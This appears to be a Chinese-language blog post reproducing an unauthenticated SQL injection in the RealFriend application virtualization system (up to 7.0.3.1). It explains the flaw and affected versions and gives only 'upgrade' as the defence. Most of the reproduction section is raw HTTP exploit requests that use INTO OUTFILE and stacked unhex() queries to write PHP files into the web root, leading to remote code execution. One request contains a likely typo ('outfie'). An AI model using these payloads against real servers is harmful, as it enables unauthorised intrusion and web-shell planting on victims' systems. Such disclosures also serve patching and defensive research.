@[toc]
# 漏洞描述
瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过 WEB 即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。未经身份认证的远程攻击者可以利用系统中存在的 SQL 注入漏洞，写入后门文件，从而执行远程代码。
# 漏洞原理
   瑞友天翼应用虚拟化系统中的 /Home/Controller/AdminController 存在 appsave/appdel 两个无需鉴权并且存在SQL注入的风险的接口，攻击者可利用 php PDO默认支持堆叠的方式使用堆叠写入恶意文件导致 RCE。
# 影响版本
5.x <= 瑞友天翼应用虚拟化系统 <= 7.0.3.1

# 漏洞复现

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/d96f67eb626c48beb8afcd40ba530ed4.png)

```yaml
GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C2.php%22+--+-&cmd=UserLogin HTTP/1.1
Host: 127.0.0.
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
```


```YAML
GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%27编码php语言%27%29+into+outfie+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Csec.xgi%27%23 HTTP/1.1
Content-type:application/x-www-form-urlencoded
User-Agent: Mozilla/5.0(Windows NT 10.0; Win64;x64)AppleWebKit/537.36(KHTML,like Gecko)Chrome/72.0.3626.121 Safari/537.36
Accept:text/html，image/gif,image/jpeg,*;q=.2，*/*;q=.2
Connection:close
```

3')%3Bselect+unhex('编码php语言')+into+outfie+'路径/文件名'%23 

# 防御方法

升级到最新版本
